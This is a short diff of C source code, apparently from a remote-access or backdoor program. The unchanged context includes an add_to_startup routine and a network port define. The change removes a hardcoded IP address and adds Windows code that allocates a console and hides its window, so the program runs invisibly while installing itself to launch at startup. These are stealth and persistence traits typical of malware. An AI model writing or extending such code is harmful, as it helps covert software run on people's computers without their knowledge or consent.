@@ -45,7 +45,7 @@ void add_to_startup(const char *exe_path) {
 #endif
 
 #define PORT 8080
-#define ADDRESS "192.168.0.105"
+
 int main() {
 	paramSurf param;
 	paramThread param2;
@@ -62,6 +62,12 @@ int main() {
 
 
 #ifdef _WIN32
+
+    HWND window;
+    AllocConsole();
+    window=FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow(window,0);
+
 	char path[MAX_PATH];
 	GetModuleFileNameA(NULL, path, MAX_PATH);
 
